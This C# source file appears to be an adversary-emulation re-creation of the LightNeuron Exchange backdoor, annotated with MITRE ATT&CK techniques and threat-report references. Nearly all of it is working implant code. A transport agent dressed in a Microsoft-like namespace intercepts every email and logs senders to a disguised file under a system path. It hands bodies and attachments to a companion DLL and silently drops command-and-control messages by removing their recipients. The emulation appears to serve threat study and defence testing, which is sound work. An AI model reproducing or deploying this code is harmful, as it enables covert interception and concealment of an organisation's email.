using Microsoft.Exchange.Data.Transport;
using Microsoft.Exchange.Data.Transport.Smtp;
using Microsoft.Exchange.Data.Transport.Email;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;

namespace Microsoft.Exchange.Transport.Agent.ConnectionFiltering;

/// Class <c>ConnectionFilteringAgentFactory</c> inherits from SmtpReceiveAgentFactory and creates
/// a ConnectionFilteringAgent [1]
/// 
/// Reference: https://docs.microsoft.com/en-us/exchange/client-developer/transport-agents/how-to-create-an-smtpreceiveagent-transport-agent-for-exchange-2013
/// </summary>
public sealed class ConnectionFilteringAgentFactory : SmtpReceiveAgentFactory
{
    public override SmtpReceiveAgent CreateAgent(SmtpServer server)
    {
        return new ConnectionFilteringAgent();
    }
}

/// <summary>
/// Class <c>ConnectionFilteringAgent</c> inherits from SmtpReceiveAgent and primarily listens for
/// the EndOfData event [1]
/// 
/// Reference: https://docs.microsoft.com/en-us/exchange/client-developer/transport-agents/how-to-create-an-smtpreceiveagent-transport-agent-for-exchange-2013
/// </summary>
public class ConnectionFilteringAgent : SmtpReceiveAgent
{
    private shared_utl utl;

    public ConnectionFilteringAgent()
    {
        this.utl = new shared_utl();
        this.OnEndOfData += new EndOfDataEventHandler(OnEndOfDataHandler);
    }

    /// <summary>
    /// The <c>OnEndOfDataHandler</c> will execute the <c>Process</c> method
    /// </summary>
    /// <param name="source"></param>
    /// <param name="e"></param>
    /*
     * onEndOfDataHandler
     *     About:
     *         The <c>OnEndOfDataHandler</c> will execute the <c>Process</c> method
     *     Result:
     *         The email is sent to the companionDLL for further analysis
     *     MITRE ATT&CK Techniques:
     *         T1114.002: Email Collection: Remote Email Collection
     *     CTI:
     *         https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf#page=12
    */
    private void OnEndOfDataHandler(ReceiveMessageEventSource source, EndOfDataEventArgs e)
    {
        this.utl.Process(e.MailItem);
    }
}

/// <summary>
/// Class <c>shared_utl</c> contains additional functionality for email processing
/// </summary>
public class shared_utl
{
    private string logPath;

    public shared_utl(string logPath="C:\\Windows\\serviceprofiles\\networkservice\\appdata\\Roaming\\Microsoft\\Windows\\msxfer.dat")
    {
        this.logPath = logPath;
    }

    /// <summary>
    /// The <c>Process</c> method logs the date and sender of the mail. Based on the return
    /// value of ProcessMsg, the email will be modified or blocked. [1]
    /// 
    /// CTI does not specify the log format.
    /// 
    /// </summary>
    /// <param name="m">the received mail</param>
    /*
     * Process
     *     About:
     *         Logs the date and sender of the email. 
     *         Based on the return value of CheckMessage, the email will be blocked
     *     Result:
     *         We have a log of what emails have come through, any emails from the C2 server are blocked
     *     MITRE ATT&CK Techniques:
     *         T1119: Automated Collection
     *         T1564.008: Hide Artifacts: Email Hiding Rules
     *     CTI:
     *         https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf#page=12
     */
    public void Process(MailItem m)
    {
        this.Log("[" + m.Message.Date + "] Received mail item from " + m.Message.Sender.SmtpAddress);

        (mail MailStruct, List<IntPtr> Pointers) src = this.ConvertToEml(m);
        switch (this.ProcessMsg(ref src.MailStruct))
        {
            case 0:
            case 1:
                break;
            case 2:
                this.Log("[" + m.Message.Date + "] Blocking mail item from " + m.Message.Sender.SmtpAddress);
                this.BlockMsg(m);
                break;
            case 3:
            case 4:
                break;

        }

        foreach (IntPtr pointer in src.Pointers)
        {
            Marshal.FreeHGlobal(pointer);
        }
    }

    /// <summary>
    /// The <c>ProcessMsg</c> method will call the companion DLL to process email data. [1]
    /// </summary>
    /// <param name="src"></param>
    /// <returns>An integer representing the code corresponding to the action performed by the
    /// companion DLL</returns>
    private int ProcessMsg(ref mail src)
    {
        /*
            * 0 - no modification
            * 1 - email modified
            * 2 - block the email
            * 3 - error
            * 4 - contains .NET assembly
            */
        //return 0;
        return MessageValidator(ref src);
    }

    /// <summary>
    /// The <c>BlockMsg</c> method will reject delivery of the message to the intended
    /// recipient(s) by removing all entries from the recipients list. [1]
    /// </summary>
    /// <param name="m"></param>
    /*
     * BlockMsg
     *     About:
     *         The <c>BlockMsg</c> method will reject delivery of the message to the intended
     *         recipient(s) by removing all entries from the recipients list. [1]
     *     Result:
     *         The given email is not sent to the intended recipient, to hide the work of this program
     *     MITRE ATT&CK Techniques:
     *         T1564.008: Hide Artifacts: Email Hiding Rules
     *     CTI:
     *         https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf#page=12
     */
    private void BlockMsg(MailItem m)
    {
        foreach (EnvelopeRecipient r in m.Recipients)
        {
            this.Log("Removing recipient: " + r.Address.ToString());
            m.Recipients.Remove(r);
        }
    }

    /// <summary>
    /// The <c>Log</c> method will log messages to the <c>logPath</c> if populated. Otherwise,
    /// messages will be written to the console.
    /// </summary>
    /// <param name="message"></param>
    private void Log(string message)
    {
        if (this.logPath.Equals(""))
        {
            Console.Out.WriteLine(message);
        }
        else
        {
            using (System.IO.StreamWriter file = new System.IO.StreamWriter(this.logPath, true))
            {
                file.WriteLine(message);
            }
        }
    }

    /// <summary>
    /// The <c>ConvertToEml</c> method will convert the MailItem to a mail struct while also returning
    /// the list of pointers to eventually be freed.
    /// 
    /// Reference: https://stackoverflow.com/questions/37733313/how-to-get-char-using-c
    /// </summary>
    /// <param name="m"></param>
    /// <returns>Tuple of mail struct and List of IntPtr</returns>
    private (mail, List<IntPtr>) ConvertToEml(MailItem m)
    {

        // get a list of recipient addresses and convert to an array
        List<string> recipientStrings = new List<string>();
        foreach (EnvelopeRecipient r in m.Recipients)
        {
            recipientStrings.Add(r.Address.ToString());
        }
        string[] recipients = recipientStrings.ToArray();

        // create list of pointers to collect and free later
        List<IntPtr> allocatedMemory = new List<IntPtr>();

        // get the size of an IntPtr and allocate an IntPtr to as many recipients as we have
        int sizeOfIntPtr = Marshal.SizeOf(typeof(IntPtr));
        IntPtr pointersToRecipients = Marshal.AllocHGlobal(sizeOfIntPtr * recipients.Length);

        // set an IntPtr for every recipient address, collect the pointer for later, and write
        // the recipient address data in pointerToRecipient starting at the base address indicated
        // in pointersToRecipients but offset by i * sizeOfIntPtr
        for (int i = 0; i < recipients.Length; ++i)
        {
            IntPtr pointerToRecipient = Marshal.StringToHGlobalAnsi(recipients[i]);
            allocatedMemory.Add(pointerToRecipient);
            Marshal.WriteIntPtr(pointersToRecipients, i * sizeOfIntPtr, pointerToRecipient);
        }

        // add the pointer to the base address to the list of pointers to free later
        allocatedMemory.Add(pointersToRecipients);


        // allocate IntPtrs to as many attachments as we have for contents and filenames
        IntPtr pointersToAttachmentContents = Marshal.AllocHGlobal(sizeOfIntPtr * m.Message.Attachments.Count);
        IntPtr pointersToAttachmentFileNames = Marshal.AllocHGlobal(sizeOfIntPtr * m.Message.Attachments.Count);

        // get a list of attachment filenames and convert to an array
        List<string> filenameStrings = new List<string>();
        foreach (Attachment a in m.Message.Attachments)
        {
            filenameStrings.Add(a.FileName.ToString());
        }
        string[] filenames = filenameStrings.ToArray();

        // set an IntPtr for every attachment filename and content, collect the pointers for later,
        // write the attachment filename to the pointerToAttachmentFileName starting at the base
        // address then base64 encode the attachment content data before writing it to
        // pointerToAttachmentContent starting at the base address
        for (int i = 0; i < m.Message.Attachments.Count; i++)
        {
            // create IntPtr for filename string
            IntPtr pointerToAttachmentFileName = Marshal.StringToHGlobalAnsi(filenames[i]);
            
            // collect pointer for later
            allocatedMemory.Add(pointerToAttachmentFileName);

            // write the pointer to the filename to the base address pointer to attachment file names
            Marshal.WriteIntPtr(pointersToAttachmentFileNames, i * sizeOfIntPtr, pointerToAttachmentFileName);

            // get the attachment content
            Stream attachmentStream = m.Message.Attachments[i].GetContentReadStream();
            MemoryStream ms = new MemoryStream();
            using (ms)
            {
                attachmentStream.CopyTo(ms);
            }
            byte[] attachmentContentBytes = ms.ToArray();

            // base64 encode the attachment content
            string b64Content = Convert.ToBase64String(attachmentContentBytes);

            // create IntPtr for the base64 encoded string
            IntPtr pointerToAttachmentContent = Marshal.StringToHGlobalAnsi(b64Content);
            
            // collect pointer for later
            allocatedMemory.Add(pointerToAttachmentContent);

            // write the pointer to the attachment content to the base address pointer to attachment contents
            Marshal.WriteIntPtr(pointersToAttachmentContents, i * sizeOfIntPtr, pointerToAttachmentContent);
        }

        // add the pointer to the base address to the list of attachment pointers to free later
        allocatedMemory.Add(pointersToAttachmentContents);
        allocatedMemory.Add(pointersToAttachmentFileNames);

        // get message body
        Stream bodyStream = m.Message.Body.GetContentReadStream();
        string body = "";
        using (var reader = new StreamReader(bodyStream, System.Text.Encoding.UTF8))
        {
            body = reader.ReadToEnd();
        }

        // create the mail struct containing the mail fields needed
        mail ret = new mail(
            m.Message.Sender.SmtpAddress.ToString(),
            m.Recipients.Count,
            pointersToRecipients,
            m.Message.Attachments.Count,
            pointersToAttachmentFileNames,
            pointersToAttachmentContents,
            m.Message.Subject,
            body
            );

        return (ret, allocatedMemory);
    }

    /// <summary>
    /// Mail struct for holding the MailItem data
    /// </summary>
    [StructLayout(LayoutKind.Sequential)]
    public struct mail
    {
        public mail(string sender, int totalRecipients, IntPtr recipients,
            int totalAttachments, IntPtr attachmentFileNames, IntPtr attachmentContents,
            string subject, string body)
        {
            this.sender = sender;
            this.totalRecipients = totalRecipients;
            this.recipients = recipients;
            this.totalAttachments = totalAttachments;
            this.attachmentFileNames = attachmentFileNames;
            this.attachmentContents = attachmentContents;
            this.subject = subject;
            this.body = body;
        }
        public string sender;
        public int totalRecipients;
        public IntPtr recipients;
        public int totalAttachments;
        public IntPtr attachmentFileNames;
        public IntPtr attachmentContents;
        public string subject;
        public string body;
    }

    /// <summary>
    /// Import MessageValidator function from DLL. 
    /// 
    /// </summary>
    /// <param name="m"></param>
    /// <returns>Int representing the action taken</returns>
    [DllImport("exdbdata.dll",  EntryPoint = "MessageValidator",
        CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode)]
    private static extern int MessageValidator(ref mail m);

}